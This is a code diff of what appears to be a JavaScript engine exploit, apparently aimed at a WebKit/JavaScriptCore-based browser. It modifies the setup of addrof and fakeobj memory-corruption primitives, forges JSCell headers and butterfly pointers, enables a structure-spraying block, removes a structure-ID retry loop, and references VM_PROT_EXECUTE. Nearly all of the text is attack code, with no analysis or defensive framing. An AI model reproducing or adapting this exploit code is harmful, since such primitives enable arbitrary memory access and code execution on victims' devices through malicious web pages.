@@ -508,7 +508,7 @@ var VM_PROT_EXECUTE = 0x4
             // fix broken cell header
             fakeArr[0] = bigint2float(doubleArrayCellHeader);
             // grab a real butterfly pointer
-            doubleArrayButterfly = float2bigint(fakeArr[1]);
+            let doubleArrayButterfly = float2bigint(fakeArr[1]);
             // fix other broken cell header
             obj.fakeButterfly = b0;
             fakeArr[0] = bigint2float(doubleArrayCellHeader);
@@ -551,13 +551,13 @@ var VM_PROT_EXECUTE = 0x4
     //
     // and the payload still work stablely. It seems this action is redundant
     
-              /*var structs = [];
+              var structs = [];
               var i = 0;
               var abc = [13.37];
               abc.pointer = 1234;
               abc['prop' + i] = 13.37;
               structs.push(abc);
-              var victim = structs[0];*/
+              var victim = structs[0x800];
 
     // take an array from somewhere in the middle so it is preceeded by non-null bytes which
     // will later be treated as the butterfly length.
@@ -576,45 +576,6 @@ var VM_PROT_EXECUTE = 0x4
     port.postMessage("[+] container @ "+ containerAddr.toString());
     // add the offset to let compiler recognize fake structure
     var hax = fakeobj(Add(containerAddr,new Int64(0x10)));
-     // fix broken cell header
-            fakeArr[0] = bigint2float(doubleArrayCellHeader);
-            // grab a real butterfly pointer
-            let doubleArrayButterfly = float2bigint(fakeArr[1]);
-            // fix other broken cell header
-            obj.fakeButterfly = b0;
-            fakeArr[0] = bigint2float(doubleArrayCellHeader);
-            // fix the broken butterflys and setup cleaner addrof / fakeobj
-            obj.jsCellHeader = bigint2float(unboxDouble(doubleArrayCellHeader));
-            obj.fakeButterfly = a1;
-            fakeArr[1] = bigint2float(doubleArrayButterfly);
-            obj.fakeButterfly = b1;
-            fakeArr[1] = bigint2float(doubleArrayButterfly);
-            fakeobj = (addr) => {
-              a1[0] = new Int64(addr).asDouble();
-              return b1[0];
-            }
-            addrof = (val) => {
-              b1[0] = val;
-              return new Int64.fromDouble(a1[0]);
-            }
-    /*var maxtry = 0;
-    if (hax instanceof Array) {
-            print("got fakeobj with real struct id");
-            //continue;
-        } else {
-            while (!(hax instanceof Array)) {
-            flags_double_array = Add(flags_double_array, Int64.One);
-            container.header = flags_double_array;
-            maxtry++;
-            if (maxtry == 100000)
-            {
-              print("wow 10000 tries on getting valid structid failed!!!");
-            }
-            }
-        }*/
-    // origButterfly is now based on the offset of **victim** 
-    // because it becomes the new butterfly pointer
-    // and hax[1] === victim.pointer
     var origButterfly = hax[1];
 
     var memory = {
